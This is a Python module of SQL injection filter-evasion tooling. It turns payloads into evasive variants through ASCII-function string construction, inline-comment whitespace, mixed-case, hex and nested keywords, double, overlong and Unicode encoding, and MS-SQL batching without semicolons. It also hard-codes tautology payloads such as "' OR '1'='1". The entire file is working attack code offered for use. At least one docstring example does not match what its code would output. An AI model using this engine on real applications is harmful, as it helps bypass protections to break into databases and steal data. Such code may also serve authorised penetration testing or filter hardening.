"""
Advanced SQL Injection Bypass Techniques

This module provides utility classes and functions for bypassing common SQL injection
filters and application-level blacklists. Implements various techniques including:
- String construction without quotes using ASCII functions (CHR/CHAR)
- Comment-based whitespace replacement
- Keyword obfuscation (mixed casing, hex encoding, keyword repetition)
- Double-encoding and canonicalization exploitation
"""

import re
import urllib.parse
import random
from typing import List, Optional, Dict
from enum import Enum


class DBMSType(Enum):
    """Supported DBMS types for bypass techniques"""
    MYSQL = "mysql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    POSTGRESQL = "postgresql"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


class StringConstructionBypass:
    """
    Bypass blocked characters by constructing strings dynamically using ASCII functions.
    
    This class provides methods to construct strings without using single quotes
    by converting strings to their ASCII/character representations.
    
    Examples:
        Oracle: 'admin' => CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
        MS-SQL: 'admin' => CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
        MySQL: 'admin' => CHAR(97,100,109,105,110)
    """
    
    @staticmethod
    def string_to_chr_oracle(string: str) -> str:
        """
        Convert string to Oracle CHR() concatenation.
        
        Args:
            string: String to convert
            
        Returns:
            Oracle CHR() representation using || concatenation
            
        Example:
            >>> StringConstructionBypass.string_to_chr_oracle("admin")
            "CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)"
        """
        if not string:
            return "''"
        
        chr_parts = [f"CHR({ord(char)})" for char in string]
        return "||".join(chr_parts)
    
    @staticmethod
    def string_to_char_mssql(string: str) -> str:
        """
        Convert string to MS-SQL CHAR() concatenation.
        
        Args:
            string: String to convert
            
        Returns:
            MS-SQL CHAR() representation using + concatenation
            
        Example:
            >>> StringConstructionBypass.string_to_char_mssql("admin")
            "CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)"
        """
        if not string:
            return "''"
        
        char_parts = [f"CHAR({ord(char)})" for char in string]
        return "+".join(char_parts)
    
    @staticmethod
    def string_to_char_mysql(string: str) -> str:
        """
        Convert string to MySQL CHAR() function.
        
        Args:
            string: String to convert
            
        Returns:
            MySQL CHAR() representation with comma-separated ASCII values
            
        Example:
            >>> StringConstructionBypass.string_to_char_mysql("admin")
            "CHAR(97,100,109,105,110)"
        """
        if not string:
            return "''"
        
        ascii_values = [str(ord(char)) for char in string]
        return f"CHAR({','.join(ascii_values)})"
    
    @staticmethod
    def string_to_hex_mysql(string: str) -> str:
        """
        Convert string to MySQL hex representation.
        
        Args:
            string: String to convert
            
        Returns:
            MySQL hex string (0x...)
            
        Example:
            >>> StringConstructionBypass.string_to_hex_mysql("admin")
            "0x61646d696e"
        """
        if not string:
            return "''"
        
        hex_str = ''.join(f'{ord(char):02x}' for char in string)
        return f"0x{hex_str}"
    
    @staticmethod
    def bypass_quotes_in_payload(payload: str, dbms: DBMSType) -> str:
        """
        Replace quoted strings in a payload with character-based construction.
        
        Args:
            payload: SQL injection payload containing quoted strings
            dbms: Target DBMS type
            
        Returns:
            Payload with quoted strings replaced by character functions
            
        Example:
            >>> StringConstructionBypass.bypass_quotes_in_payload("' OR 'a'='a", DBMSType.MYSQL)
            "' OR CHAR(97)=CHAR(97)"
        """
        # Find all single-quoted strings
        pattern = r"'([^']*)'"
        
        def replace_quote(match):
            string_content = match.group(1)
            if not string_content:
                return "''"
            
            if dbms == DBMSType.ORACLE:
                return StringConstructionBypass.string_to_chr_oracle(string_content)
            elif dbms == DBMSType.MSSQL:
                return StringConstructionBypass.string_to_char_mssql(string_content)
            elif dbms == DBMSType.MYSQL:
                return StringConstructionBypass.string_to_char_mysql(string_content)
            elif dbms == DBMSType.POSTGRESQL:
                # PostgreSQL also supports CHR, similar to Oracle
                return StringConstructionBypass.string_to_chr_oracle(string_content)
            else:
                return match.group(0)  # Return original if unknown
        
        return re.sub(pattern, replace_quote, payload)


class CommentWhitespaceBypass:
    """
    Use SQL comments to replace spaces and break up keywords.
    
    This class provides methods to insert inline comments in place of spaces
    and within keywords to evade filters.
    """
    
    @staticmethod
    def space_to_inline_comment(payload: str, comment_style: str = "/**/") -> str:
        """
        Replace spaces with inline comments.
        
        Args:
            payload: SQL injection payload
            comment_style: Comment style to use (default: /**/)
            
        Returns:
            Payload with spaces replaced by comments
            
        Example:
            >>> CommentWhitespaceBypass.space_to_inline_comment("SELECT FROM users")
            "SELECT/**/FROM/**/users"
        """
        return payload.replace(' ', comment_style)
    
    @staticmethod
    def insert_comment_in_keywords(payload: str, keywords: Optional[List[str]] = None) -> str:
        """
        Insert comments within keywords to break up filtered terms (MySQL specific).
        
        Args:
            payload: SQL injection payload
            keywords: List of keywords to break up (default: common SQL keywords)
            
        Returns:
            Payload with comments inserted within keywords
            
        Example:
            >>> CommentWhitespaceBypass.insert_comment_in_keywords("SELECT")
            "SEL/**/ECT" or "SE/**/LECT"
        """
        if keywords is None:
            keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 
                       'UPDATE', 'DELETE', 'TABLE', 'DATABASE', 'DROP']
        
        result = payload
        for keyword in keywords:
            # Find keyword occurrences (case-insensitive)
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)
            
            # Split keyword in middle and insert comment
            if len(keyword) > 2:
                mid = len(keyword) // 2
                broken_keyword = f"{keyword[:mid]}/*_*/{keyword[mid:]}"
                result = pattern.sub(broken_keyword, result)
        
        return result
    
    @staticmethod
    def create_logical_block_injection(payload: str) -> str:
        """
        Create logical block injection when comment symbols are blocked.
        
        Args:
            payload: Base injection payload
            
        Returns:
            Payload using logical blocks (e.g., ' OR 'a'='a)
            
        Example:
            >>> CommentWhitespaceBypass.create_logical_block_injection("base")
            "' OR 'a'='a"
        """
        # Common logical block patterns that don't require comments
        patterns = [
            "' OR 'a'='a",
            "' OR '1'='1",
            "' OR 1=1 OR 'a'='a",
            "') OR ('a'='a",
            "' AND '1'='1' AND 'a'='a",
        ]
        return patterns[0]  # Return most common pattern
    
    @staticmethod
    def generate_comment_variations(payload: str) -> List[str]:
        """
        Generate multiple variations using different comment styles.
        
        Args:
            payload: SQL injection payload
            
        Returns:
            List of payload variations with different comment styles
        """
        variations = [payload]  # Include original
        
        # Different comment styles
        comment_styles = [
            "/**/",
            "/*!*/",
            "/*_*/",
            "/*!50000*/",
            "/**_**/",
        ]
        
        for style in comment_styles:
            variations.append(CommentWhitespaceBypass.space_to_inline_comment(payload, style))
        
        # Add keyword-broken versions
        variations.append(CommentWhitespaceBypass.insert_comment_in_keywords(payload))
        
        return variations


class KeywordVariantBypass:
    """
    Generate keyword variants to bypass naive blacklists and filters.
    
    Implements techniques including:
    - Mixed case variations
    - Hex encoding
    - Keyword repetition (e.g., SELSELECTECT)
    """
    
    @staticmethod
    def mixed_case_variant(keyword: str, pattern: Optional[str] = None) -> str:
        """
        Generate mixed case variant of keyword.
        
        Args:
            keyword: SQL keyword
            pattern: Optional pattern ('alternate', 'random', 'camel')
            
        Returns:
            Mixed case variant
            
        Example:
            >>> KeywordVariantBypass.mixed_case_variant("SELECT", "alternate")
            "SeLeCt"
        """
        if pattern == 'alternate':
            return ''.join(c.upper() if i % 2 == 0 else c.lower() 
                          for i, c in enumerate(keyword))
        elif pattern == 'random':
            return ''.join(c.upper() if random.random() > 0.5 else c.lower() 
                          for c in keyword)
        elif pattern == 'camel':
            # CamelCase style: first letter upper, rest alternating
            return ''.join(c.upper() if i == 0 or i % 2 == 1 else c.lower() 
                          for i, c in enumerate(keyword))
        else:
            # Default: simple alternation
            return ''.join(c.upper() if i % 2 == 0 else c.lower() 
                          for i, c in enumerate(keyword))
    
    @staticmethod
    def hex_encode_keyword(keyword: str, full: bool = True) -> str:
        """
        Hex encode keyword (e.g., SELECT => %53%45%4c%45%43%54).
        
        Args:
            keyword: SQL keyword to encode
            full: If True, encode all characters; if False, encode some characters
            
        Returns:
            Hex encoded keyword
            
        Example:
            >>> KeywordVariantBypass.hex_encode_keyword("SELECT")
            "%53%45%4c%45%43%54"
        """
        if full:
            return ''.join(f'%{ord(c):02X}' for c in keyword)
        else:
            # Partial encoding - encode every other character
            return ''.join(f'%{ord(c):02X}' if i % 2 == 0 else c 
                          for i, c in enumerate(keyword))
    
    @staticmethod
    def keyword_repetition(keyword: str) -> str:
        """
        Create keyword with repetition (e.g., SELSELECTECT).
        
        This bypasses filters that only remove one occurrence of the keyword.
        
        Args:
            keyword: SQL keyword
            
        Returns:
            Keyword with nested repetition
            
        Example:
            >>> KeywordVariantBypass.keyword_repetition("SELECT")
            "SELSELECTECT"
        """
        if len(keyword) < 3:
            return keyword
        
        mid = len(keyword) // 2
        return keyword[:mid] + keyword + keyword[mid:]
    
    @staticmethod
    def generate_keyword_variants(keyword: str) -> List[str]:
        """
        Generate multiple variants of a keyword.
        
        Args:
            keyword: SQL keyword
            
        Returns:
            List of keyword variants
        """
        variants = [keyword]  # Include original
        
        # Add case variations
        variants.append(keyword.lower())
        variants.append(keyword.upper())
        variants.append(KeywordVariantBypass.mixed_case_variant(keyword, 'alternate'))
        variants.append(KeywordVariantBypass.mixed_case_variant(keyword, 'camel'))
        
        # Add hex encoding
        variants.append(KeywordVariantBypass.hex_encode_keyword(keyword))
        variants.append(KeywordVariantBypass.hex_encode_keyword(keyword, full=False))
        
        # Add repetition
        variants.append(KeywordVariantBypass.keyword_repetition(keyword))
        
        return variants
    
    @staticmethod
    def apply_to_payload(payload: str, keywords: Optional[List[str]] = None) -> List[str]:
        """
        Apply keyword variants to a payload.
        
        Args:
            payload: SQL injection payload
            keywords: Keywords to vary (default: common SQL keywords)
            
        Returns:
            List of payload variations
        """
        if keywords is None:
            keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
        
        variations = [payload]
        
        for keyword in keywords:
            # Try each keyword variant
            for variant in KeywordVariantBypass.generate_keyword_variants(keyword):
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                new_payload = pattern.sub(variant, payload)
                if new_payload != payload:
                    variations.append(new_payload)
        
        return variations


class EncodingBypass:
    """
    Exploit defective filters and canonicalization bugs.
    
    Implements techniques including:
    - Double encoding
    - Partial/mixed encoding
    - Recursive decoding exploitation
    """
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """
        Apply double URL encoding to payload.
        
        Args:
            payload: SQL injection payload
            
        Returns:
            Double URL encoded payload
            
        Example:
            >>> EncodingBypass.double_url_encode("' OR 1=1")
            "%2527%2520OR%25201%253D1"
        """
        # First encoding
        first_encode = urllib.parse.quote(payload, safe='')
        # Second encoding
        second_encode = urllib.parse.quote(first_encode, safe='')
        return second_encode
    
    @staticmethod
    def partial_encode(payload: str, ratio: float = 0.5) -> str:
        """
        Partially encode payload (some characters hex, some normal).
        
        Args:
            payload: SQL injection payload
            ratio: Ratio of characters to encode (0.0 to 1.0)
            
        Returns:
            Partially encoded payload
        """
        result = []
        for char in payload:
            if random.random() < ratio:
                result.append(f'%{ord(char):02X}')
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """
        Apply mixed encoding strategies to payload.
        
        Args:
            payload: SQL injection payload
            
        Returns:
            Payload with mixed encoding
        """
        # Encode special characters but leave keywords partially readable
        special_chars = ["'", '"', '<', '>', '=', ';', '(', ')', ' ']
        result = []
        for char in payload:
            if char in special_chars:
                result.append(f'%{ord(char):02X}')
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def unicode_encode(payload: str, style: str = 'standard') -> str:
        """
        Unicode encode payload.
        
        Args:
            payload: SQL injection payload
            style: Encoding style ('standard', 'overlong', 'mixed')
            
        Returns:
            Unicode encoded payload
        """
        if style == 'standard':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif style == 'overlong':
            # Overlong UTF-8 encoding for special chars
            replacements = {
                "'": "%C0%A7",
                '"': "%C0%A2",
                '<': "%C0%BC",
                '>': "%C0%BE",
            }
            result = payload
            for char, encoded in replacements.items():
                result = result.replace(char, encoded)
            return result
        elif style == 'mixed':
            # Mix of URL encoding and unicode
            result = []
            for char in payload:
                if random.random() < 0.3:
                    result.append(f'\\u{ord(char):04x}')
                elif random.random() < 0.6:
                    result.append(f'%{ord(char):02X}')
                else:
                    result.append(char)
            return ''.join(result)
        else:
            return payload
    
    @staticmethod
    def generate_encoding_variants(payload: str) -> List[str]:
        """
        Generate multiple encoding variants of a payload.
        
        Args:
            payload: SQL injection payload
            
        Returns:
            List of encoded payload variants
        """
        variants = [payload]  # Include original
        
        # URL encoding variants
        variants.append(urllib.parse.quote(payload, safe=''))
        variants.append(EncodingBypass.double_url_encode(payload))
        variants.append(EncodingBypass.partial_encode(payload, 0.3))
        variants.append(EncodingBypass.partial_encode(payload, 0.7))
        variants.append(EncodingBypass.mixed_encoding(payload))
        
        # Unicode variants
        variants.append(EncodingBypass.unicode_encode(payload, 'standard'))
        variants.append(EncodingBypass.unicode_encode(payload, 'overlong'))
        
        return variants


class BatchQueryBypass:
    """
    Enable batch query injection in MS-SQL without semicolons.
    """
    
    @staticmethod
    def batch_without_semicolon(queries: List[str]) -> str:
        """
        Create batch query without semicolons for MS-SQL.
        
        Args:
            queries: List of SQL queries to batch
            
        Returns:
            Batched query string
            
        Example:
            >>> BatchQueryBypass.batch_without_semicolon(["SELECT 1", "SELECT 2"])
            "SELECT 1\nSELECT 2" or with alternative separators
        """
        # MS-SQL alternatives to semicolon
        # 1. Using newline (chr(10))
        # 2. Using EXEC to wrap statements
        
        # Simple newline approach
        return '\n'.join(queries)
    
    @staticmethod
    def batch_with_exec(queries: List[str]) -> str:
        """
        Create batch query using EXEC for MS-SQL.
        
        Args:
            queries: List of SQL queries to batch
            
        Returns:
            Batched query using EXEC
            
        Example:
            >>> BatchQueryBypass.batch_with_exec(["SELECT 1", "SELECT 2"])
            "EXEC('SELECT 1') EXEC('SELECT 2')"
        """
        exec_queries = [f"EXEC('{query}')" for query in queries]
        return ' '.join(exec_queries)


class AdvancedBypassEngine:
    """
    Main engine that orchestrates all bypass techniques.
    
    This class integrates all bypass techniques and provides a unified interface
    for generating bypass payloads.
    """
    
    def __init__(self, dbms: Optional[DBMSType] = None):
        """
        Initialize the bypass engine.
        
        Args:
            dbms: Target DBMS type (can be auto-detected later)
        """
        self.dbms = dbms or DBMSType.UNKNOWN
        self.string_bypass = StringConstructionBypass()
        self.comment_bypass = CommentWhitespaceBypass()
        self.keyword_bypass = KeywordVariantBypass()
        self.encoding_bypass = EncodingBypass()
        self.batch_bypass = BatchQueryBypass()
    
    def set_dbms(self, dbms: DBMSType):
        """Set or update the target DBMS type."""
        self.dbms = dbms
    
    def generate_all_bypass_variants(self, payload: str, max_variants: int = 50) -> List[str]:
        """
        Generate all bypass variants for a given payload.
        
        Args:
            payload: Original SQL injection payload
            max_variants: Maximum number of variants to generate
            
        Returns:
            List of bypass payload variants
        """
        variants = [payload]  # Include original
        
        # 1. String construction bypasses (if quotes present)
        if "'" in payload or '"' in payload:
            if self.dbms != DBMSType.UNKNOWN:
                try:
                    variants.append(self.string_bypass.bypass_quotes_in_payload(payload, self.dbms))
                except Exception:
                    pass  # Skip if conversion fails
        
        # 2. Comment-based bypasses
        variants.extend(self.comment_bypass.generate_comment_variations(payload))
        
        # 3. Keyword variant bypasses
        keyword_variants = self.keyword_bypass.apply_to_payload(payload)
        variants.extend(keyword_variants[:max_variants // 3])
        
        # 4. Encoding bypasses
        encoding_variants = self.encoding_bypass.generate_encoding_variants(payload)
        variants.extend(encoding_variants[:max_variants // 4])
        
        # Remove duplicates while preserving order
        seen = set()
        unique_variants = []
        for variant in variants:
            if variant not in seen:
                seen.add(variant)
                unique_variants.append(variant)
        
        return unique_variants[:max_variants]
    
    def generate_string_construction_variants(self, payload: str) -> List[str]:
        """
        Generate variants using string construction techniques.
        
        Args:
            payload: Original payload
            
        Returns:
            List of string construction variants
        """
        variants = []
        
        # Try all DBMS types if unknown
        if self.dbms == DBMSType.UNKNOWN:
            for dbms in [DBMSType.MYSQL, DBMSType.MSSQL, DBMSType.ORACLE, DBMSType.POSTGRESQL]:
                try:
                    variants.append(self.string_bypass.bypass_quotes_in_payload(payload, dbms))
                except Exception:
                    pass
        else:
            try:
                variants.append(self.string_bypass.bypass_quotes_in_payload(payload, self.dbms))
            except Exception:
                pass
        
        return variants
    
    def generate_comment_bypass_variants(self, payload: str) -> List[str]:
        """Generate comment-based bypass variants."""
        return self.comment_bypass.generate_comment_variations(payload)
    
    def generate_keyword_bypass_variants(self, payload: str) -> List[str]:
        """Generate keyword obfuscation variants."""
        return self.keyword_bypass.apply_to_payload(payload)
    
    def generate_encoding_bypass_variants(self, payload: str) -> List[str]:
        """Generate encoding-based bypass variants."""
        return self.encoding_bypass.generate_encoding_variants(payload)
